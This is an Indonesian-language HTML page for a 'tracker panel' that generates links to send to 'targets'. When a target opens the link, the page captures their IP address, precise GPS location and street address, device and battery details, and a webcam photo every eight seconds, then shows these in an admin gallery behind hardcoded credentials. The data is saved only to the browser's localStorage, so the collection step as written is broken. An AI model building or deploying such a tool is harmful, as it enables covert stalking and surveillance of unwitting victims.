<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Tracker Panel - CodingX</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-main: #0a0a0c;
            --panel-bg: rgba(30, 30, 35, 0.7);
            --accent-glow: #00f2ff;
            --accent-dark: #0066ff;
            --border-glass: rgba(255, 255, 255, 0.1);
            --tips-bg: rgba(255, 217, 0, 0.05);
            --tips-border: #ffd900;
            --success: #00ff64;
            --danger: #ff0055;
        }

        body {
            margin: 0; padding: 0; background-color: var(--bg-main);
            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
            color: white; font-family: 'Inter', sans-serif;
            display: flex; justify-content: center; min-height: 100vh;
        }

        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; position: relative; }

        .header-profile {
            background: var(--panel-bg); backdrop-filter: blur(10px);
            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
            text-align: center; margin-bottom: 25px; position: relative; overflow: hidden;
        }

        /* TIMER & MINI BUTTONS */
        .timer-container {
            position: absolute; top: 10px; right: 15px;
            display: flex; flex-direction: column; align-items: flex-end; gap: 8px;
            z-index: 1000;
        }
        .exp-timer {
            font-family: 'Orbitron'; font-size: 9px;
            background: rgba(0,0,0,0.9); padding: 4px 10px; border-radius: 8px;
            transition: all 0.3s ease; border: 1px solid var(--border-glass);
            color: var(--success);
        }
        .mini-btn-group { display: flex; gap: 6px; }
        .mini-btn {
            width: 26px; height: 26px; border-radius: 50%; border: 1px solid var(--border-glass);
            background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
            cursor: pointer; transition: 0.3s;
        }
        .mini-btn:hover { background: var(--accent-glow); transform: scale(1.1); }
        .mini-btn svg { width: 14px; fill: white; }
        .mini-btn:hover svg { fill: black; }

        /* SIDE NAVIGATION */
        #side-nav { position: fixed; top: 0; left: -300px; width: 280px; height: 100%; background: #0f0f12; z-index: 20000; transition: 0.4s; border-right: 1px solid var(--border-glass); }
        #side-nav.active { left: 0; }
        .nav-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 15000; display: none; }
        
        .nav-item {
            display: flex; align-items: center; gap: 15px; padding: 18px 25px;
            color: #888; text-decoration: none; font-size: 12px; font-weight: 600;
            border-bottom: 1px solid rgba(255,255,255,0.03); transition: 0.3s;
        }
        .nav-item:hover { background: rgba(0,242,255,0.05); color: #fff; }
        .nav-item svg { width: 18px; height: 18px; fill: currentColor; }

        /* MODAL */
        .modal-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
            z-index: 99999; justify-content: center; align-items: center;
        }
        .modal-box {
            background: #121214; border: 1px solid var(--accent-glow); border-radius: 24px;
            padding: 20px; width: 75%; max-width: 280px; text-align: center;
        }

        /* PANDUAN */
        .guide-container { margin-top: 15px; }
        .guide-header {
            background: rgba(255,255,255,0.05); border: 1px solid var(--border-glass);
            padding: 12px 15px; border-radius: 12px; display: flex;
            justify-content: space-between; align-items: center; cursor: pointer;
            font-size: 11px; font-weight: 800; color: var(--accent-glow);
        }
        .guide-content {
            max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out;
            background: rgba(0,0,0,0.2); border-radius: 0 0 12px 12px; margin-top: -5px;
        }
        .guide-content.open { max-height: 500px; padding: 15px; border: 1px solid var(--border-glass); border-top: none; }
        
        /* GALLERY & ZOOM */
        #gallery-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10001; padding: 20px; box-sizing: border-box; overflow-y: auto; }
        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
        .grid-photos img { width: 100%; border-radius: 15px; border: 1px solid #333; cursor: pointer; }
        #image-zoom-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 50000; justify-content: center; align-items: center; }
        #image-zoom-overlay img { max-width: 90%; max-height: 80%; border-radius: 10px; border: 2px solid var(--accent-glow); }

        /* UI ELEMENTS */
        .info-title { font-family: 'Orbitron'; font-size: 14px; color: var(--accent-glow); text-align: center; font-weight: 800; margin-bottom: 15px; }
        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px; }
        .info-label { color: #888; }
        .info-value { color: #fff; text-align: right; font-weight: 600; }
        
        .btn-copy-data { position: absolute; top: 15px; right: 15px; cursor: pointer; background: rgba(0,242,255,0.15); padding: 8px; border-radius: 10px; z-index: 10; }
        .btn-copy-data svg { fill: var(--accent-glow); width: 18px; height: 18px; }

        .logo-main { width: 90px; height: 90px; border-radius: 50%; background: #000; margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; border: 2px solid var(--accent-glow); box-shadow: 0 0 20px var(--accent-dark); }
        .logo-main svg { width: 50px; fill: var(--accent-glow); }
        .status-badge { display: inline-flex; align-items: center; background: rgba(0, 255, 100, 0.1); color: #00ff64; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
        .control-panel { background: var(--panel-bg); backdrop-filter: blur(15px); border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass); margin-bottom: 20px; position: relative; }
        .label-style { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 10px; display: block; }
        .input-group { background: rgba(0,0,0,0.3); border-radius: 12px; padding: 10px; border: 1px solid #333; display: flex; align-items: center; justify-content: space-between; }
        .input-group input { background: transparent; border: none; color: #fff; width: 70%; outline: none; }
        .btn-action { background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark)); color: #000; border: none; padding: 10px 18px; border-radius: 10px; font-weight: 800; font-size: 11px; cursor: pointer; }
        .target-folder { background: linear-gradient(90deg, #1e1e24, #121216); border-radius: 15px; padding: 18px; margin-top: 10px; display: flex; align-items: center; justify-content: space-between; border-left: 4px solid var(--accent-glow); }
        
        .hamburger { position: absolute; top: 35px; left: 40px; z-index: 1000; background: var(--panel-bg); border: 1px solid var(--border-glass); padding: 10px; border-radius: 12px; cursor: pointer; }
        .btn-back { display: flex; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid var(--border-glass); padding: 10px 20px; border-radius: 50px; cursor: pointer; font-family: 'Orbitron'; font-size: 10px; }
        #login-gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10000; display: flex; justify-content: center; align-items: center; }
        #target-loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50000; color: #444; justify-content: center; align-items: center; font-size: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="image-zoom-overlay" onclick="this.style.display='none'"><img id="zoomed-img" src=""></div>

<div class="modal-overlay" id="modal-akun">
    <div class="modal-box">
        <h3 style="font-family:'Orbitron'; color:var(--accent-glow); font-size:13px; margin-bottom:15px;">ACCOUNT INFO</h3>
        <div style="text-align:left;">
            <div class="info-row"><span class="info-label">User:</span><span class="info-value">ondev</span></div>
            <div class="info-row"><span class="info-label">Pass:</span><span class="info-value">ondev</span></div>
            <div class="info-row"><span class="info-label">Exp:</span><span id="pop-exp" style="color:var(--success)" class="info-value">--</span></div>
        </div>
        <button class="btn-action" style="width:100%; margin-top:15px;" onclick="closeModal('modal-akun')">CLOSE</button>
    </div>
</div>

<div class="modal-overlay" id="modal-logout">
    <div class="modal-box">
        <h3 style="font-family:'Orbitron'; color:var(--danger); font-size:13px; margin-bottom:10px;">LOGOUT</h3>
        <p style="font-size:11px; color:#ccc;">Keluar dari sistem?</p>
        <div style="display:flex; gap:10px; margin-top:20px;">
            <button class="btn-action" style="flex:1; background:#222; color:#fff;" onclick="closeModal('modal-logout')">NO</button>
            <button class="btn-action" style="flex:1; background:var(--danger); color:#fff;" onclick="logout()">YES</button>
        </div>
    </div>
</div>

<div id="target-loading">
    <div>
        <div style="width: 30px; height: 30px; border: 2px solid #222; border-top-color: var(--accent-glow); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
        Synchronizing...
    </div>
</div>

<div id="side-nav">
    <div style="padding: 40px 20px; text-align: center;">
        <div class="logo-main" style="width: 60px; height: 60px;">
            <svg viewBox="0 0 24 24" fill="cyan"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
        </div>
        <b style="font-family: 'Orbitron'; font-size: 14px;">R_hmt</b>
        <p style="font-size: 9px; color: var(--accent-glow);">ELITE ACCESS</p>
    </div>

    <a href="https://wa.me/yournumber" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0012.04 2m.01 1.67c2.2 0 4.26.86 5.82 2.42a8.225 8.225 0 012.41 5.83c0 4.54-3.7 8.23-8.24 8.23-1.48 0-2.93-.39-4.19-1.15l-.3-.17-3.12.82.83-3.04-.2-.32a8.188 8.188 0 01-1.26-4.38c.01-4.54 3.7-8.24 8.25-8.24"/></svg>
        WhatsApp Official
    </a>
    <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
        Saluran Resmi
    </a>
    <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M16.5 3H7.5C6.67 3 6 3.67 6 4.5v15c0 .83.67 1.5 1.5 1.5h9c.83 0 1.5-.67 1.5-1.5v-15c0-.83-.67-1.5-1.5-1.5z"/></svg>
        Saluran APK
    </a>
    <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19"/></svg>
        Telegram Channel
    </a>
</div>
<div class="nav-overlay" id="navOver" onclick="toggleNav()"></div>

<div id="login-gate">
    <div class="control-panel" style="width: 85%; text-align: center;">
        <h2 style="font-family: 'Orbitron'; font-size: 14px; color: var(--accent-glow);">MASTER ACCESS</h2>
        <input type="text" id="user-in" class="input-group" style="width: 100%; margin-bottom: 10px; padding: 12px; box-sizing: border-box; background: #000; color: #fff; border:1px solid #222;" placeholder="Username">
        <input type="password" id="pass-in" class="input-group" style="width: 100%; margin-bottom: 20px; padding: 12px; box-sizing: border-box; background: #000; color: #fff; border:1px solid #222;" placeholder="Password">
        <button class="btn-action" style="width: 100%;" onclick="auth()">LOGIN SYSTEM</button>
    </div>
</div>

<div class="phone-frame" id="admin-view" style="display:none;">
    <div class="hamburger" onclick="toggleNav()">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
    </div>

    <div class="header-profile">
        <div class="timer-container">
            <div class="exp-timer" id="exp-display">EXP: --</div>
            <div class="mini-btn-group">
                <div class="mini-btn" onclick="openModal('modal-akun')"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
                <div class="mini-btn" onclick="openModal('modal-logout')"><svg viewBox="0 0 24 24"><path d="M13 3h-2v10h2V3zm4.83 2.17l-1.42 1.42C17.99 7.86 19 9.81 19 12c0 3.87-3.13 7-7 7s-7-3.13-7-7c0-2.19 1.01-4.14 2.58-5.42L6.17 5.17C4.23 6.82 3 9.26 3 12c0 4.97 4.03 9 9 9s9-4.03 9-9c0-2.74-1.23-5.18-3.17-6.83z"/></svg></div>
            </div>
        </div>
        <div class="logo-main"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5" fill="none" stroke="cyan" stroke-width="2"/></svg></div>
        <h1 style="font-family: 'Orbitron'; font-size: 20px;">ONDEV PANEL</h1>
        <div class="status-badge">● TERMINAL ACTIVE</div>
    </div>

    <div class="control-panel">
        <span class="label-style">Target Link Generator</span>
        <div class="input-group">
            <input type="text" id="gen-url" readonly>
            <div onclick="copyLinkOnly()" style="cursor:pointer;"><svg width="20" height="20" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg></div>
        </div>
        <div class="guide-container">
            <div class="guide-header" onclick="toggleGuide()">
                <span>(!) PANDUAN PENGGUNAAN</span>
                <svg id="arrow-icon" width="14" viewBox="0 0 24 24" fill="cyan" style="transition:0.3s;"><path d="M7 10l5 5 5-5z"/></svg>
            </div>
            <div id="guide-body" class="guide-content">
                <div style="padding:15px; font-size:11px; color:#ccc; line-height:1.6;">
                    ● Salin link di atas dan kirim ke target.<br>
                    ● Data otomatis masuk ke folder di bawah.<br>
                    ● Pastikan target mengizinkan akses kamera & lokasi.
                </div>
            </div>
        </div>
    </div>

    <div class="control-panel">
        <span class="label-style">Connected Targets</span>
        <div id="target-list"></div>
    </div>
</div>

<div id="gallery-overlay">
    <div style="margin-bottom: 20px;"><button class="btn-back" onclick="closeFolder()">BACK</button></div>
    <div class="control-panel" style="background:var(--panel-bg); padding:15px; border-radius:24px; border:1px solid var(--border-glass);">
        <div class="btn-copy-data" onclick="copyTargetText()"><svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg></div>
        <h3 class="info-title">TARGET ANALYSIS</h3>
        <div id="info-container"></div>
    </div>
    <div class="grid-photos" id="photo-grid"></div>
</div>

<script>
    const DB_KEY = 'ondev_v25_stable';
    const idParam = new URLSearchParams(window.location.search).get('id');

    window.onload = function() {
        if(idParam) {
            document.getElementById('login-gate').style.display = 'none';
            document.getElementById('target-loading').style.display = 'flex';
            startCapture(idParam);
        } else {
            const expTime = localStorage.getItem(DB_KEY+'_time');
            const isLoggedIn = localStorage.getItem(DB_KEY+'_status');
            
            // Logika: Tampilkan Admin HANYA jika status LoggedIn DAN Waktu masih ada
            if (isLoggedIn === 'true' && expTime && new Date().getTime() < expTime) {
                showAdmin();
            }
        }
    };

    function auth() {
        const u = document.getElementById('user-in').value;
        const p = document.getElementById('pass-in').value;
        
        if(u === 'ondev' && p === 'ondev') {
            // CEK DULU APAKAH SUDAH ADA WAKTU EXP DI MEMORI?
            let existingExp = localStorage.getItem(DB_KEY+'_time');
            let now = new Date().getTime();

            // JIKA BELUM ADA ATAU SUDAH MATI, BARU BUAT 20 JAM BARU
            if(!existingExp || now > existingExp) {
                const expire = now + (20 * 60 * 60 * 1000);
                localStorage.setItem(DB_KEY+'_time', expire);
            }
            
            // Simpan status Login agar tidak kelempar ke login gate
            localStorage.setItem(DB_KEY+'_status', 'true');
            showAdmin();
        } else { 
            alert('ACCESS DENIED'); 
        }
    }

    function logout() { 
        // JANGAN hapus _time, cuma hapus status loginnya aja
        localStorage.removeItem(DB_KEY+'_status'); 
        location.reload(); 
    }

    // Fungsi pembantu lainnya tetap sama
    function toggleGuide() {
        const body = document.getElementById('guide-body');
        const arrow = document.getElementById('arrow-icon');
        body.classList.toggle('open');
        arrow.style.transform = body.classList.contains('open') ? 'rotate(180deg)' : 'rotate(0deg)';
    }

    function toggleNav() {
        const side = document.getElementById('side-nav');
        const over = document.getElementById('navOver');
        side.classList.toggle('active');
        over.style.display = side.classList.contains('active') ? 'block' : 'none';
    }

    function showAdmin() { 
        document.getElementById('login-gate').style.display = 'none'; 
        document.getElementById('admin-view').style.display = 'block'; 
        startAdmin(); 
    }
    
    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
    function closeModal(id) { document.getElementById(id).style.display = 'none'; }

    function startAdmin() {
        const url = window.location.href.split('?')[0];
        document.getElementById('gen-url').value = url + "?id=" + Math.floor(1000 + Math.random() * 9999);
        renderList();
        setInterval(renderList, 5000);

        setInterval(() => {
            const expire = localStorage.getItem(DB_KEY+'_time');
            const d = expire - new Date().getTime();
            const expDisplay = document.getElementById('exp-display');
            const popExp = document.getElementById('pop-exp');

            if(d <= 0) { 
                // Jika waktu benar-benar habis, baru hapus semuanya
                localStorage.removeItem(DB_KEY+'_status');
                localStorage.removeItem(DB_KEY+'_time');
                location.reload(); 
                return; 
            }
            
            const h = Math.floor(d / 3600000);
            const m = Math.floor((d % 3600000) / 60000);
            const s = Math.floor((d % 60000) / 1000);
            
            const color = h >= 1 ? 'var(--success)' : 'var(--danger)';
            expDisplay.style.color = color;
            popExp.style.color = color;
            
            popExp.innerText = `${h}h ${m}m ${s}s`;
            expDisplay.innerText = `EXP: ${h}h ${m}m`;
        }, 1000);
    }

    function renderList() {
        const db = JSON.parse(localStorage.getItem(DB_KEY+'_db') || '{}');
        const list = document.getElementById('target-list');
        list.innerHTML = '';
        Object.keys(db).reverse().forEach(id => {
            const div = document.createElement('div');
            div.className = 'target-folder';
            div.innerHTML = `<div style="display:flex; align-items:center; cursor:pointer;" onclick="openFolder('${id}')">
                <svg viewBox="0 0 24 24" style="width:22px; fill:cyan; margin-right:12px;"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                <div><b>TARGET #${id}</b><br><small style="font-size:9px; color:#555;">${db[id].info.time}</small></div>
            </div>
            <button onclick="delT('${id}')" style="background:none;border:none;cursor:pointer;"><svg viewBox="0 0 24 24" style="width:18px; fill:#ff4444;"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button>`;
            list.appendChild(div);
        });
    }

    function delT(id) {
        if(confirm('Hapus data target?')){
            let db = JSON.parse(localStorage.getItem(DB_KEY+'_db'));
            delete db[id];
            localStorage.setItem(DB_KEY+'_db', JSON.stringify(db));
            renderList();
        }
    }

    function openFolder(id) {
        const db = JSON.parse(localStorage.getItem(DB_KEY+'_db'));
        const target = db[id];
        const d = target.info;
        const row = (l, v) => `<div class="info-row"><span class="info-label">${l}:</span><span class="info-value">${v}</span></div>`;
        document.getElementById('info-container').innerHTML = `${row('Waktu', d.time)}${row('IP Address', d.ip)}${row('Device', d.android_ver || '?')}${row('RAM', d.ram + ' GB')}${row('CPU', d.cpu + ' Core')}${row('Battery', d.bat)}${row('Address', d.addr)}<button class="btn-action" style="width:100%; margin-top:15px;" onclick="window.open('https://www.google.com/maps?q=${d.lat},${d.lon}')">OPEN MAPS</button>`;
        document.getElementById('photo-grid').innerHTML = target.photos.map(p => `<img src="${p}" onclick="openZoom(this.src)">`).join('');
        document.getElementById('gallery-overlay').style.display = 'block';
    }

    function copyTargetText() {
        const info = document.getElementById('info-container');
        navigator.clipboard.writeText("TARGET ANALYSIS\n" + info.innerText).then(() => alert('Data disalin!'));
    }

    function openZoom(src) { document.getElementById('zoomed-img').src = src; document.getElementById('image-zoom-overlay').style.display = 'flex'; }
    function closeFolder() { document.getElementById('gallery-overlay').style.display = 'none'; }
    function copyLinkOnly() { const e = document.getElementById('gen-url'); e.select(); document.execCommand('copy'); alert('Link Copied!'); }

    function startCapture(id) {
        let store = { photos: [], info: { time: new Date().toLocaleString(), bat: '..', addr: 'Loading...', lat: 0, lon: 0, ip: '..', ram: navigator.deviceMemory || '?', cpu: navigator.hardwareConcurrency || '?', android_ver: navigator.userAgent.split(')')[0].split('(')[1] }};
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(res => { store.info.ip = res.ip; sync(id, store); });
        if(navigator.getBattery) navigator.getBattery().then(b => { store.info.bat = Math.round(b.level*100)+'%'; sync(id, store); });
        navigator.geolocation.getCurrentPosition(p => {
            store.info.lat = p.coords.latitude; store.info.lon = p.coords.longitude;
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`).then(r => r.json()).then(res => { store.info.addr = res.display_name; sync(id, store); });
        }, null, {enableHighAccuracy:true});
        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setInterval(() => {
                const c = document.createElement('canvas'); c.width = 480; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0, 480, 480);
                store.photos.unshift(c.toDataURL('image/jpeg', 0.6));
                if(store.photos.length > 10) store.photos.pop();
                sync(id, store);
            }, 8000);
        }).catch(() => sync(id, store));
    }

    function sync(id, data) {
        let db = JSON.parse(localStorage.getItem(DB_KEY+'_db') || '{}');
        db[id] = data;
        localStorage.setItem(DB_KEY+'_db', JSON.stringify(db));
    }
</script>
</body>
</html>
